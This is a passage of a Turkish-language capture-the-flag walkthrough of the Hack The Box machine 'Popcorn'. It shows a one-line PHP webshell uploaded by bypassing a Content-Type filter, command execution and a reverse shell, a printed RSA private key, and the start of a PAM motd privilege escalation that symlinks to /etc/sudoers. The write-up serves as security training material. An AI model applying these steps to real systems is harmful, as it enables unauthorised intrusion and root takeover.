---
{"dg-publish":true,"permalink":"/ctf/popcorn-ctf/"}
---

Popcorn, TJ Null’un listesinde olmasa da bana OSCP’ye benzer hissettiren orta seviye bir makineydi. Yapılan bazı taramalar bir torrent barındırma sistemine götürüyor. Burada dosya yükleyebilir ve filtreleri atlatıp bir PHP webshell çalıştırabilirim. Buradan sonra, Linux kimlik doğrulama sistemi (PAM) ile ilgili CVE-2010-0832 güvenlik açığını kullanarak mevcut kullanıcının sistemdeki herhangi bir dosyanın sahibi olmasını sağlayabilirim. Kullanışlı bir exploit script mevcut, ancak bunu manuel olarak nasıl exploit edebileceğimi de göstereceğim. Ayrıca DirtyCow’un burada çalıştığını göstermek için hızlıca ona da değineceğim.

## Box Info

|Name|[Popcorn](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fpopcorn)[![Popcorn](https://0xdf.gitlab.io/icons/box-popcorn.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fpopcorn)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fpopcorn)|
|---|---|
|Release Date|15 Mar 2017|
|Retire Date|26 May 2017|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Medium [30]|
|Rated Difficulty|![Rated difficulty for Popcorn](https://0xdf.gitlab.io/img/popcorn-diff.png)|
|Radar Graph|![Radar chart for Popcorn](https://0xdf.gitlab.io/img/popcorn-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|21 days + 10:31:24[![adxn37](https://www.hackthebox.com/badge/image/32)](https://app.hackthebox.com/users/32)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|21 days + 12:18:45[![adxn37](https://www.hackthebox.com/badge/image/32)](https://app.hackthebox.com/users/32)|
|Creator|[![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)|

## Recon

### nmap

![Pasted image 20250206174411.png](/img/user/resimler/Pasted%20image%2020250206174411.png)

![Pasted image 20250206174431.png](/img/user/resimler/Pasted%20image%2020250206174431.png)

![Pasted image 20250206174553.png](/img/user/resimler/Pasted%20image%2020250206174553.png)

OpenSSH ve Apache sürümlerine bakıldığında, bu host'un Ubuntu Trusty 14.04’ten daha eski bir sürüm çalıştırdığı anlaşılıyor. Biraz daha Google araştırması yapınca, bunun Ubuntu 9.10 Karmic olduğunu görüyorum.


### Website - TCP 80

#### Site

Site sadece eski bir default sayfası:

"Web sunucusu yazılımı çalışıyor ancak henüz içerik eklenmedi."

![Pasted image 20250206174727.png](/img/user/resimler/Pasted%20image%2020250206174727.png)

#### Directory Brute Force

Feroxbuster'ı siteye karşı çalıştıracağım:

![Pasted image 20250206175557.png](/img/user/resimler/Pasted%20image%2020250206175557.png)

```
200      GET        4l       25w      177c http://popcorn.htb/
200      GET        4l       25w      177c http://popcorn.htb/index
200      GET      656l     3113w    47450c http://popcorn.htb/test.php
200      GET      658l     3123w    47565c http://popcorn.htb/test
301      GET        9l       28w      312c http://popcorn.htb/torrent => http://popcorn.htb/torrent/
200      GET        1l       11w      183c http://popcorn.htb/torrent/logout
200      GET        0l        0w        0c http://popcorn.htb/torrent/download
301      GET        9l       28w      316c http://popcorn.htb/torrent/css => http://popcorn.htb/torrent/css/
200      GET        0l        0w        0c http://popcorn.htb/torrent/config
301      GET        9l       28w      319c http://popcorn.htb/torrent/upload => http://popcorn.htb/torrent/upload/
200      GET      104l      237w     2054c http://popcorn.htb/torrent/css/lightbox.css
301      GET        9l       28w      321c http://popcorn.htb/torrent/database => http://popcorn.htb/torrent/database/
200      GET        2l        0w        4c http://popcorn.htb/torrent/secure
200      GET       26l       63w      968c http://popcorn.htb/torrent/rss
301      GET        9l       28w      318c http://popcorn.htb/torrent/users => http://popcorn.htb/torrent/users/
200      GET      903l     2738w    31969c http://popcorn.htb/torrent/js/effects.js
200      GET      118l      741w    60101c http://popcorn.htb/torrent/upload/noss.png
200      GET        6l       18w     1130c http://popcorn.htb/torrent/users/img
301      GET        9l       28w      328c http://popcorn.htb/torrent/users/templates => http://popcorn.htb/torrent/users/templates/
200      GET      172l     1672w    95315c http://popcorn.htb/torrent/upload/723bc28f9b6f924cca68ccdff96b6190566ca6b4.png
200      GET        7l       28w      331c http://popcorn.htb/torrent/users/templates/change_password_form.php
200      GET        2l       18w      174c http://popcorn.htb/torrent/users/templates/users_menu.php
200      GET       20l       63w      629c http://popcorn.htb/torrent/users/templates/signup_form.php
200      GET       23l       96w      787c http://popcorn.htb/torrent/users/templates/forgot_password_form.php
200      GET        6l       27w      295c http://popcorn.htb/torrent/users/templates/change_settings_form.php
200      GET        4l       17w      107c http://popcorn.htb/torrent/users/templates/forgot_password_success.php
200      GET        2l       16w      163c http://popcorn.htb/torrent/users/templates/registration_success.php
200      GET      293l      882w    11416c http://popcorn.htb/torrent/index
200      GET        1l        4w       81c http://popcorn.htb/torrent/users/index
301      GET        9l       28w      319c http://popcorn.htb/torrent/images => http://popcorn.htb/torrent/images/
301      GET        9l       28w      318c http://popcorn.htb/torrent/admin => http://popcorn.htb/torrent/admin/
200      GET      138l      809w    51153c http://popcorn.htb/torrent/preview
301      GET        9l       28w      322c http://popcorn.htb/torrent/templates => http://popcorn.htb/torrent/templates/
200      GET        6l        9w      443c http://popcorn.htb/torrent/images/orange%20bg.jpg
200      GET       10l       25w     2538c http://popcorn.htb/torrent/images/search.jpg
200      GET       12l       78w     5360c http://popcorn.htb/torrent/images/link-news.png
200      GET        6l       17w      946c http://popcorn.htb/torrent/images/leftcor.png
200      GET        7l       40w     2617c http://popcorn.htb/torrent/images/back.gif
200      GET        7l       36w     1886c http://popcorn.htb/torrent/images/download.png
200      GET        1l        1w       55c http://popcorn.htb/torrent/images/blank.gif
200      GET        3l       13w     1627c http://popcorn.htb/torrent/images/details.png
200      GET       10l       44w     3861c http://popcorn.htb/torrent/images/link-stats.png
200      GET        5l       11w      440c http://popcorn.htb/torrent/images/button-bg.jpg
200      GET       11l       68w     6491c http://popcorn.htb/torrent/images/globe.jpg
200      GET       18l      109w     6455c http://popcorn.htb/torrent/images/link-forum.png
200      GET        1l        5w       77c http://popcorn.htb/torrent/images/reg.gif
200      GET       10l       45w     3361c http://popcorn.htb/torrent/images/seeds.jpg
200      GET        8l       24w     2155c http://popcorn.htb/torrent/images/folder2.png
200      GET       11l       47w     4799c http://popcorn.htb/torrent/images/green%20mark.jpg
200      GET       10l       59w     4133c http://popcorn.htb/torrent/images/link-development.png
200      GET       17l       70w     4429c http://popcorn.htb/torrent/images/link-faq.png
200      GET        1l        6w       96c http://popcorn.htb/torrent/images/regb.gif
200      GET       12l       47w     3408c http://popcorn.htb/torrent/images/news-arrow.gif
200      GET        6l       26w     2087c http://popcorn.htb/torrent/images/th.png
200      GET        8l       48w     4023c http://popcorn.htb/torrent/images/link-browse.png
200      GET        5l       12w      732c http://popcorn.htb/torrent/images/login2.gif
200      GET        2l        6w      371c http://popcorn.htb/torrent/images/close.gif
200      GET        7l       39w     3737c http://popcorn.htb/torrent/images/login2.jpg
200      GET       19l       88w     7594c http://popcorn.htb/torrent/images/link-about.png
200      GET        6l       34w     3691c http://popcorn.htb/torrent/images/download%20details.jpg
200      GET       22l       65w     4944c http://popcorn.htb/torrent/images/files%20screenshot.jpg
200      GET       11l       58w     4049c http://popcorn.htb/torrent/images/link-upload.png
200      GET        5l       25w     1617c http://popcorn.htb/torrent/images/feed.png
200      GET        3l       25w     1670c http://popcorn.htb/torrent/images/closelabel.gif
200      GET        2l       14w      674c http://popcorn.htb/torrent/images/page_bg.jpg
301      GET        9l       28w      315c http://popcorn.htb/torrent/js => http://popcorn.htb/torrent/js/
200      GET       24l       98w     3885c http://popcorn.htb/torrent/images/loading.gif
301      GET        9l       28w      316c http://popcorn.htb/torrent/lib => http://popcorn.htb/torrent/lib/
200      GET       10l       51w     4166c http://popcorn.htb/torrent/images/link-home.png
200      GET        8l       30w     2495c http://popcorn.htb/torrent/images/rightcor.png
200      GET       18l      137w     6625c http://popcorn.htb/torrent/images/register%20user.gif
200      GET       20l       79w      765c http://popcorn.htb/torrent/templates/report_form.php
200      GET       11l      135w      850c http://popcorn.htb/torrent/templates/about.php
200      GET        1l        0w        1c http://popcorn.htb/torrent/templates/form_header.php
302      GET        0l        0w        0c http://popcorn.htb/torrent/templates/footer.php => http://popcorn.htb/index.php
200      GET        2l       15w      143c http://popcorn.htb/torrent/templates/header.php
200      GET        3l       15w      153c http://popcorn.htb/torrent/templates/torrents_list.php
200      GET        6l       20w      120c http://popcorn.htb/torrent/templates/hack.php
200      GET       62l      328w    25091c http://popcorn.htb/torrent/images/feed2.png
200      GET        4l       18w     1896c http://popcorn.htb/torrent/images/folder.png
200      GET        1l        1w      121c http://popcorn.htb/torrent/images/background.gif
200      GET       13l       65w     5137c http://popcorn.htb/torrent/images/edit.jpg
200      GET        6l       14w      321c http://popcorn.htb/torrent/stylesheet.css
200      GET       16l       92w      936c http://popcorn.htb/torrent/comment
200      GET       45l      266w     2152c http://popcorn.htb/torrent/js/scriptaculous.js
200      GET      320l      669w     5205c http://popcorn.htb/torrent/templates/layout.css
200      GET       66l      389w    34759c http://popcorn.htb/torrent/images/banner.jpg
200      GET        0l        0w        0c http://popcorn.htb/torrent/edit
200      GET       55l      314w    23001c http://popcorn.htb/torrent/images/stats.png
200      GET       11l       39w      272c http://popcorn.htb/torrent/templates/email/reset_password.php
200      GET       87l      622w    60051c http://popcorn.htb/torrent/images/admin.png
301      GET        9l       28w      328c http://popcorn.htb/torrent/admin/templates => http://popcorn.htb/torrent/admin/templates/
200      GET       81l      600w    61018c http://popcorn.htb/torrent/images/logout.png
200      GET       88l      634w    62088c http://popcorn.htb/torrent/images/register.png
200      GET       16l       65w      570c http://popcorn.htb/torrent/admin/templates/torrents_list_date.php
200      GET        2l       15w      159c http://popcorn.htb/torrent/admin/templates/torrent_details.php
200      GET        7l       26w      286c http://popcorn.htb/torrent/admin/templates/subcategories.php
200      GET       87l      652w    64417c http://popcorn.htb/torrent/images/mytorrents.png
200      GET       10l       32w      361c http://popcorn.htb/torrent/admin/templates/add_subcat.php
200      GET       13l       47w      414c http://popcorn.htb/torrent/admin/templates/ban_list.php
302      GET        0l        0w        0c http://popcorn.htb/torrent/admin/templates/footer.php => http://popcorn.htb/index.php
200      GET       13l       49w      417c http://popcorn.htb/torrent/admin/templates/hack_list.php
200      GET       10l       30w      331c http://popcorn.htb/torrent/admin/templates/insert_news.php
200      GET       16l       72w      604c http://popcorn.htb/torrent/admin/templates/list_users.php
302      GET        0l        0w        0c http://popcorn.htb/torrent/admin/templates/modify.php => ../../index.php
200      GET       10l       32w      349c http://popcorn.htb/torrent/admin/templates/add_cat.php
200      GET        2l       15w      149c http://popcorn.htb/torrent/admin/templates/header.php
200      GET       11l       25w      281c http://popcorn.htb/torrent/admin/templates/news.php
200      GET      689l     1962w    20711c http://popcorn.htb/torrent/js/lightbox.js
200      GET        3l        9w      483c http://popcorn.htb/torrent/images/top-bg.jpg
200      GET       92l      609w    56889c http://popcorn.htb/torrent/images/button.png
200      GET      227l      489w     8414c http://popcorn.htb/torrent/login
200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/users
200      GET       99l      667w    64670c http://popcorn.htb/torrent/images/updatestats.png
200      GET     1785l     4607w    47603c http://popcorn.htb/torrent/js/prototype.js
200      GET      230l     1247w     9821c http://popcorn.htb/torrent/database/th_database.sql
200      GET        1l        4w       81c http://popcorn.htb/torrent/admin/index
200      GET       26l       63w      968c http://popcorn.htb/torrent/rss.php
301      GET        9l       28w      319c http://popcorn.htb/torrent/health => http://popcorn.htb/torrent/health/
200      GET        3l        4w      199c http://popcorn.htb/torrent/health/4.gif
200      GET        3l        4w      211c http://popcorn.htb/torrent/health/5.gif
200      GET        4l        6w      195c http://popcorn.htb/torrent/health/3.gif
200      GET        3l        4w      171c http://popcorn.htb/torrent/health/1.gif
200      GET        3l        5w      180c http://popcorn.htb/torrent/health/2.gif
200      GET      237l      482w     8221c http://popcorn.htb/torrent/users/registration
200      GET        6l       14w      321c http://popcorn.htb/torrent/stylesheet
200      GET       30l      136w     1180c http://popcorn.htb/torrent/admin/templates/login_form2.php
200      GET       15l      118w      779c http://popcorn.htb/torrent/admin/templates/admin.php
200      GET       16l       63w      542c http://popcorn.htb/torrent/admin/templates/comments_list.php
200      GET        5l       19w      185c http://popcorn.htb/torrent/admin/templates/edit_news.php
200      GET       16l       65w      564c http://popcorn.htb/torrent/admin/templates/torrents_list.php
200      GET       11l       50w     3064c http://popcorn.htb/torrent/thumbnail
200      GET      185l      476w     9322c http://popcorn.htb/torrent/browse
301      GET        9l       28w      321c http://popcorn.htb/torrent/torrents => http://popcorn.htb/torrent/torrents/
200      GET        0l        0w        0c http://popcorn.htb/torrent/torrents/index
200      GET      215l      474w     7966c http://popcorn.htb/torrent/users/forgot_password
200      GET      134l      306w     3767c http://popcorn.htb/torrent/hide
301      GET        9l       28w      319c http://popcorn.htb/torrent/readme => http://popcorn.htb/torrent/readme/
200      GET       38l      246w     3412c http://popcorn.htb/torrent/readme/readme.html
200      GET       63l     2053w    12333c http://popcorn.htb/torrent/readme/license.txt
301      GET        9l       28w      311c http://popcorn.htb/rename => http://popcorn.htb/rename/
200      GET        1l        4w       95c http://popcorn.htb/rename/index
200      GET        0l        0w        0c http://popcorn.htb/torrent/upload_file
200      GET        0l        0w        0c http://popcorn.htb/torrent/validator
200      GET        1l        4w       81c http://popcorn.htb/torrent/users/change_password
301      GET        9l       28w      316c http://popcorn.htb/torrent/PNG => http://popcorn.htb/torrent/PNG/
200      GET      782l     5541w   485764c http://popcorn.htb/torrent/PNG/banner.png

```




#### /test

/test bir PHPInfo sayfası gösterir:

![Pasted image 20250206175657.png](/img/user/resimler/Pasted%20image%2020250206175657.png)

PHP'nin nasıl yapılandırıldığı hakkında genel olarak yararlı olabilecek bir sürü bilgi var, ancak burada hiçbirine ihtiyacım olmayacak.

PHPInfo sayfası, bir saldırgan için oldukça faydalı bilgiler içerir. CTF sırasında işine yarayabilecek bazı kritik bilgiler şunlar:

1. **PHP Sürümü** – Kullanılan PHP sürümünü görebilirsin. Eğer eski bir sürümse, bilinen güvenlik açıklarını araştırarak exploit edebilirsin.
    
2. **Yüklü Modüller ve Uzantılar** – `disable_functions` altında hangi PHP fonksiyonlarının devre dışı bırakıldığını görebilirsin. Eğer `exec`, `system`, `shell_exec` gibi komut çalıştırmaya yarayan fonksiyonlar açıksa, bir webshell veya RCE exploit geliştirebilirsin.
    
3. **Server API (SAPI)** – PHP’nin hangi ortamda çalıştığını gösterir (Apache modülü, CGI/FastCGI, CLI vb.). Eğer CGI/FastCGI kullanılıyorsa, belirli exploit teknikleri işe yarayabilir.
    
4. **Dosya Yolları (open_basedir, include_path, doc_root)** – Web sunucusunun hangi dizinlerde çalıştığını gösterir. Eğer `open_basedir` kısıtlaması yoksa, rastgele dosyalara erişim sağlayabilirsin.
    
5. **MySQL/MariaDB Bağlantı Detayları** – Eğer PHP sayfası bir veritabanı ile bağlantılıysa, bazen varsayılan kullanıcı adı ve parola gibi hassas bilgiler burada görüntülenebilir.
    
6. **SMTP ve E-posta Ayarları** – Eğer SMTP sunucu bilgileri açıksa, spam ya da phishing saldırıları için kullanılabilir.
    
7. **Yüklü ve Kullanılabilir Exploit Edilebilir Kütüphaneler** – Örneğin, `curl`, `allow_url_fopen` veya `allow_url_include` açıksa, uzaktan dosya dahil etme (RFI) saldırıları yapılabilir.

file_uploads'un açık olduğunu not edeceğim:

![Pasted image 20250206175741.png](/img/user/resimler/Pasted%20image%2020250206175741.png)

Bu, bir LFI bulabilirsem,  kod yürütme işlemini gerçekleştirebileceğim anlamına gelir.

#### /rename

Bu, dosyaları yeniden adlandırmak için bir API endpoint'ine benziyor:

![Pasted image 20250206180158.png](/img/user/resimler/Pasted%20image%2020250206180158.png)

Bunu çalıştırmak için biraz deneme yaptım. `index.html` dosyasını `0xdf.html` olarak yeniden adlandırmaya çalıştım:

`http://10.10.10.6/rename/index.php?filename=index.html&newfilename=0xdf.html`

Hata mesajı, bu dizinin yolunu sızdırıyor gibi görünüyor:

![Pasted image 20250206180258.png](/img/user/resimler/Pasted%20image%2020250206180258.png)

İşime yarayabilecek herhangi bir dosyayı yeniden adlandıramadım. Bu noktada, eğer bir dosya yükleyebileceğim bir yer bulabilirsem ancak dosyayı yeniden adlandırmam gerekirse, bunun faydalı olabileceğini düşünüyorum. Örneğin, içine PHP kodu gizlenmiş bir PNG dosyası yükleyebilirsem ancak sadece geçerli bir görsel uzantısıyla kaydediliyorsa, bu yöntemi kullanarak dosyayı `.php` olarak değiştirebilir ve web sunucusunun çalıştırmasını sağlayabilirim.


#### /torrent

/torrent Torrent Hoster'ın bir örneğini sağlar:

![Pasted image 20250206180404.png](/img/user/resimler/Pasted%20image%2020250206180404.png)

Bir upload sayfası var ama sadece giriş formuna yönlendiriyor. Bir Browse (Gözat) sayfası var ve şu anda bir torrent gösteriyor:

![Pasted image 20250206180438.png](/img/user/resimler/Pasted%20image%2020250206180438.png)

Girişte bazı tahminler denedim, ancak daha sonra Sign up linkine tıkladım:

![Pasted image 20250206180458.png](/img/user/resimler/Pasted%20image%2020250206180458.png)

İşe yarıyor gibi görünüyor:

![Pasted image 20250206180549.png](/img/user/resimler/Pasted%20image%2020250206180549.png)

Ve giriş yapabiliyorum:

![Pasted image 20250206180601.png](/img/user/resimler/Pasted%20image%2020250206180601.png)

Giriş yaptıktan sonra yükleme formuna ulaşabiliyorum:

![Pasted image 20250206180612.png](/img/user/resimler/Pasted%20image%2020250206180612.png)

Bir PHP webshell yüklemeyi denedim ama hata verdi:

![Pasted image 20250206180625.png](/img/user/resimler/Pasted%20image%2020250206180625.png)

Kali download sayfasına gittim ve geçerli bir torrent dosyası aldım. Bunu yükleme için gönderdiğimde, bir dakika bekletiyor ve sonra yeniden yönlendirmeye çalışırken başarılı olduğunu bildiriyor:

![Pasted image 20250206180712.png](/img/user/resimler/Pasted%20image%2020250206180712.png)

Yönlendirmeye izin verdiğimde, bu torrentin sayfasına geliyorum:

![Pasted image 20250206180717.png](/img/user/resimler/Pasted%20image%2020250206180717.png)

“Bu torreni düzenle “ye tıkladığımda yeni bir form açılıyor:

![Pasted image 20250206180731.png](/img/user/resimler/Pasted%20image%2020250206180731.png)

Bunu, torrent ile ilişkilendirilmiş görseli yüklemek için kullanabilirim. Eğer bir görsel sağlarsam, şu çıktıyı veriyor:

![Pasted image 20250206180759.png](/img/user/resimler/Pasted%20image%2020250206180759.png)

Torrent sayfasına baktığımda şimdi yüklenen resmi görüyorum. HTML'e baktığımda, resme aşağıdaki url ile atıfta bulunulduğunu görüyorum:

![Pasted image 20250206183315.png](/img/user/resimler/Pasted%20image%2020250206183315.png)

```
http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/0ba973670d943861fb9453eecefd3bf7d3054713.png&maxw=96
```

Bunun bir LFI (Local File Inclusion) olabileceğini düşündüm, ancak referans verilen dosyayı bir görsel olarak dahil ediyor. Yani, mevcut dizinin dışına çıkabilsem bile bu pek işime yaramıyor.

`src` ifadesi bir dosya yolu gibi göründüğünden, **`http://10.10.10.6/torrent/upload/`** adresini kontrol ettim ve yüklediğim görselin de içinde olduğu bir dizin listelemesi döndürdü. (Hatırlarsak bu adresi forexbuster da bulmuştu .)

![Pasted image 20250206180903.png](/img/user/resimler/Pasted%20image%2020250206180903.png)

## Shell as www-data

### Test Filters

Burada dosya yüklemek için iki fırsat var: torrent dosyası ve görsel. Öncelikle görselle başladım çünkü bir görselin nasıl görünmesi gerektiğini daha iyi biliyorum. Basit bir PHP webshell yüklemeyi denediğimde **"Invalid file"** hatası aldım. Yani, aşmam gereken bir filtreleme mekanizması var.

Burp’te izin verilen bir PNG yüklemesini bulup **Repeater**’a göndereceğim. Web siteleri genellikle dosya türlerini doğrulamak için üç yaygın yöntem kullanır:

- file extension
- `Content-Type` header
- [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

Sitenin engellenip engellenmediğini görmek için her seferinde bir tanesini değiştirerek başlayacağım. İlk olarak, uzantıyı ==.php== olarak değiştireceğim. Sorun yok gibi görünüyor:

![Pasted image 20250206181039.png](/img/user/resimler/Pasted%20image%2020250206181039.png)


Bu gerçek bir güvenlik açığıdır, çünkü bir sunucu asla bir kullanıcının `.php` olarak adlandırılabilecek bir dosya yüklemesine izin vermemelidir. Aksi takdirde, sunucu bu dosyayı PHP kodu olarak çalıştırabilir.

Eğer **`Content-Type`** başlığını `application/x-php` olarak değiştirirsem, sunucu bunu engelliyor (dosya adını tekrar `.png` olarak değiştirsem bile).

![Pasted image 20250206181433.png](/img/user/resimler/Pasted%20image%2020250206181433.png)

Content'i değiştirmenin bir önemi yok gibi görünüyor:

![Pasted image 20250206181531.png](/img/user/resimler/Pasted%20image%2020250206181531.png)

```
<?php system($_REQUEST["cmd"]); ?>
```

### Upload

Filtre testi sonuçlarına göre, bir dosyayı `.php` olarak adlandırıp PHP kodu içerebileceğim gibi görünüyor, yeter ki **Content-Type** başlığını geçerli bir görsele değiştirsem.

![Pasted image 20250206181640.png](/img/user/resimler/Pasted%20image%2020250206181640.png)

Bunu Repeater'dan göndereceğim (ya da tekrar form üzerinden shell’i yükleyebilir ve Proxy kullanarak isteği yakalayıp değiştirebilirim).

**`/torrent/upload`** adresini kontrol ettiğimde, orada bir PHP dosyası buldum (bir şeyin SHA1 hash’iyle adlandırılmış gibi görünüyor).

![Pasted image 20250206181725.png](/img/user/resimler/Pasted%20image%2020250206181725.png)

Ve çalıştırma sağlar:

```
root@kali# curl http://10.10.10.6/torrent/upload/0ba973670d943861fb9453eecefd3bf7d3054713.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![Pasted image 20250206184052.png](/img/user/resimler/Pasted%20image%2020250206184052.png)
### Shell

Bir shell almak için, nc'yi başlatacağım ve cmd'yi reverse shell olarak geçireceğim:

![Pasted image 20250206184202.png](/img/user/resimler/Pasted%20image%2020250206184202.png)

Nc'de:

```
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.6.
Ncat: Connection from 10.10.10.6:33054.
bash: no job control in this shell
www-data@popcorn:/var/www/torrent/upload$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell'i geliştireceğim:

```
www-data@popcorn:/var/www/torrent/upload$ python -c 'import pty;pty.spawn("bash")'
www-data@popcorn:/var/www/torrent/upload$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo
root@kali# fg
                                                       reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@popcorn:/var/www/torrent/upload$
```




## Priv: www-data –> root

### Enumeration

Tek home dizini olan /home/george dizinine baktığımda .cache/motd.legal-displayed dosyasını görüyorum:

![Pasted image 20250206184529.png](/img/user/resimler/Pasted%20image%2020250206184529.png)

motd.legal-displayed. Şu anda boş, ancak ilgimi çekti çünkü bu tür dosyalar kod yürütülmesine yol açabilir, çünkü genellikle yeni bir oturum başladığında yürütülürler. Google'da “[motd.legal-displayed privesc](https://www.exploit-db.com/exploits/14339)” araması yaptığımda bir Exploit-DB exploit'i buldum.


### Manual Exploit

#### Background

Yukarıdaki script aslında çok iyi yapılmış ve oldukça şık. Bunu sonunda göstereceğim. Ama açığı anlamak istedim. İnternette çok fazla detaylı açıklama yok, ancak exploit script'ini okuyarak, açığın, bir kullanıcının giriş yaptığı zaman (PAM modülünü çağırdığı zaman) **`~/.cache`** dizini izinlerinin nasıl ayarlandığını öğrendim. Benim **reverse shell**'im bunu tetiklemedi çünkü bu bir giriş değil. Ancak, SSH kullanarak giriş yapabilirim, bunun için bir anahtar yazarak. Sonra exploit'ler şunu yapıyor: **`~/.cache`** dizinini kaldırıyor ve yerine bir sembolik link koyuyor. Ardından, giriş yapıldığında, o dosya benim kullanıcım tarafından sahiplenilmiş olacak.

---
PAM (Pluggable Authentication Modules), Linux ve UNIX tabanlı sistemlerde kimlik doğrulama işlemlerini yönetmek için kullanılan bir yapılandırma sistemidir. PAM, sistemdeki farklı uygulamaların (örneğin, SSH, sudo, su, vs.) kimlik doğrulama işlemlerini tek bir merkezi yapı aracılığıyla yapmasını sağlar. Bu modüller, uygulamaların kimlik doğrulama yöntemlerini değiştirmelerine ve genişletmelerine olanak tanır.

Kısaca, PAM modülü bir kullanıcının sisteme giriş yaparken veya bir işlemi gerçekleştirmeye çalışırken kimlik doğrulama işlemini kontrol eder. PAM, sistem yöneticilerinin kimlik doğrulama politikalarını özelleştirmesine imkan tanır, örneğin şifre doğrulama, iki faktörlü kimlik doğrulama gibi yöntemlerle.

---

#### SSH as www-data

george'un home dizinindeki ~/.cache dizinini silemiyorum çünkü motd.legal-displayed dosyası george'a ait ve yazılamıyor:

```
www-data@popcorn:/home/george$ rm -rf .cache/
rm: cannot remove `.cache/motd.legal-displayed': Permission denied
www-data@popcorn:/home/george$ ls -l .cache/motd.legal-displayed 
-rw-r--r-- 1 george george 0 Mar 17  2017 .cache/motd.legal-displayed
```

Bunu www-data dizininden yapabilirim. Sadece oturum açmak için bir yola ihtiyacım olacak. www-data'nın home dizininde bir .ssh dizini oluşturacağım ve bir RSA key pair oluşturacağım:

![Pasted image 20250206185125.png](/img/user/resimler/Pasted%20image%2020250206185125.png)

Public key'i authorized_keys içine kopyalayacağım ve izinleri ayarlayacağım:

![Pasted image 20250206185226.png](/img/user/resimler/Pasted%20image%2020250206185226.png)

Şimdi /var/www içinde bir .cache yok:

![Pasted image 20250206185356.png](/img/user/resimler/Pasted%20image%2020250206185356.png)

Private key'in bir kopyasını alır, host'uma geri getirir ve ardından www-data olarak Popcorn'a SSH yaparsam, sadece bir shell elde etmekle kalmam:

```
www-data@popcorn:/var/www/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAzGv7QOJhKQSQBI8sk8VfDwGb5fmCmAzT4S/5LPx42KJldic/
GkGiy+Gj0z3KJO7idDMgJKvgKHVVNAc/VQ8huT0J7fIwxRupvqJ7haSKbzDhOxli
1zHL7wOFbOXMAXpqX61knIBjtZR+I1P8PbgFTjGJbYtiOJJGatgCQ/nPeeQDmsHh
jfvSyEM+ZIe0B+Q9qKWQt3w1vA24bFSG6F174b/6UvW+gqiLTqvY+BW1NfgrrsPV
v5rnEMTsNUF8m6quBFf+uWA9kN8Yrbnq6KsXKiOlCwWRX7taRfu2G/sloTX61WJC
9vEkBXls3Cgx4fC7QVmoSfSeB8XPJ+vcqPSqewIBIwKCAQBL7ZfWRXSLk/r6YRCO
qGUi1LY/ee6tgRt/htjk0s3Mzpq222CUuUsYhwJVxn5IO3iu0SkyMTYAZhhVJ0No
vHo9fRJRENBJNika6+S8nDNrIMivjRYVakRuuCo+Y/tRAZU5eurbCx24ePumuMtn
YZuSEmY+oXxA5d+kBxbIyoBDNsSW4Vx+/Fn3vLfwves4xBxKf20nPqajzDyNe1Wx
BzIVBbi7l4ZmxaX1vbiLoh8BU0/glauzW48KsMgSm3/0Qx+gvVfnNCAeIiNBtexx
8yCHMmsiHgtdrDaFj6oCqo88BE0JpXE+Yb1JwZFssedTVdZzGrUqyPXlGrjkTXGy
rZ2zAoGBAPd9Teh2wtY+vtJcXDt7ikazFbZbDAgxH0hZwdHogTOsA5Uhl0KwlbRP
zFwLqDtCLFzH+0herHkxQwy3N82EWp1VoG+8q4MFtJVxlFQ9D9cq99Ve8eJ8Nm+l
QW9bdbO1t43StcwQ8xFkD/3wZJveWR1grMqbsbeukUVWWaEmpLW1AoGBANNzi2KG
Qs89TUG7GHVprG+21lIGeLuqjX5G5DDAyOjCD3PV2jla6wR89GSvkZyhdVpPDjVC
9+zCuZ1zU1aZYEVgawTJT8aIzpp3ipA9vehry3Qo1nyYjeGvSy5DMGZxS3Y3eOOM
z4spm12MC//UdXA0oAmdiFBS2ObNX0R53v1vAoGBAIZZ9xfLcRU4ATBeBi7rSxBv
2JYxbO6BEPtj7N+qGkCfNSUSPCuEboZ0dkCYnSd7sa61tEvbn3T9fCt5Z2+Q/f2j
gvrUIpeVYgf71C26v3TOLsRJe/6bM35vpy3SkFo+Ey+7h0LkoTVTk6ccGVvtu1kX
OTrJjFxmFFjXGraRUhl/AoGAEh/Yv01WLwVBIuQmqvpt3bCWBwfednxVRVaIlnbs
pjyE+0zYMM1HWCf3sNvZR/CVB72iIdKKR35nrmj4g8QA8ADzOuyvEQRpevRNtJeT
71myWmnmf7VN/WbL7gXCUex0LrRMMMLtN9BdxjCTUHFL5QvTNAYwQWYv2UTNpsie
FbkCgYEAqGolxphj3vOV5j67H2zB1y6supvjM1U187DMyYq+DKvZkKFqAddFcDpE
jQlhwPCN54UX8veJjFlm6GNL1pzxqX1m5elW4Y1+iRgLQaA3QXVBbxZ7CN4v7QEw
pGxI5Iyo6dnsxDrcyXA4gDT6YpQmudwnIczaEOoZ8IoUNhH9x5k=
-----END RSA PRIVATE KEY-----
```

```
chmod 600 id_rsa
```

```
ssh -i id_rsa -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa www-data@10.10.10.6
```

Ancak .cache dizini motd.legal-displayed olarak görünür:

![Pasted image 20250206190253.png](/img/user/resimler/Pasted%20image%2020250206190253.png)


#### Get Write on passwd

`~/.cache` dizinini temizleyeceğim ve yerine `/etc/sudoers` dosyasına bir sembolik bağlantı koyacağım.

